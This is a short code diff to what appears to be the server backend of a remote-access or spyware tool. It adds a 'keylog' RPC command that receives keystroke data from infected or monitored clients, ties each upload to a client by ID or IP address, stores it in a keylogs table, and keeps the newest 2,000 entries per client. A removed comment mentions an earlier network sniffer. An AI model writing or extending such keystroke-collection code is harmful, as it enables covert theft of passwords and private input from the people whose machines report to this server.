@@ -127,13 +127,42 @@ export function handleRpc(msg, remoteIp) {
       return { ok: true, uploadId: Number(info.lastInsertRowid), filename: name, size: bytes.length };
     }
 
+    case 'keylog': {
+      const clientId = Number(msg.clientId || 0);
+      const data = String(msg.data || '').slice(0, 65536);
+      if (!data) return { error: 'empty' };
+
+      let client = null;
+      if (clientId) {
+        client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
+      }
+      if (!client) {
+        client = db.prepare(sql`
+          SELECT id FROM clients WHERE user_id = ? AND ip = ?
+          ORDER BY last_seen DESC LIMIT 1
+        `).get(uid, ip);
+      }
+      if (!client) return { error: 'client not registered' };
+
+      db.prepare(sql`
+        INSERT INTO keylogs (user_id, client_id, data, created_at)
+        VALUES (?, ?, ?, ?)
+      `).run(uid, client.id, data, Date.now());
+
+      db.prepare(sql`
+        DELETE FROM keylogs WHERE client_id = ? AND id NOT IN (
+          SELECT id FROM keylogs WHERE client_id = ? ORDER BY id DESC LIMIT 2000
+        )
+      `).run(client.id, client.id);
+
+      return { ok: true, len: data.length };
+    }
+
     default:
       return { error: `unknown cmd: ${cmd}` };
   }
 }
 
-// kept for the raw TCP listener path. unused now that the sniffer is gone,
-// but harmless to leave exported.
 export function handleTcpLine(line, sock, remoteIp) {
   let reply;
   try {
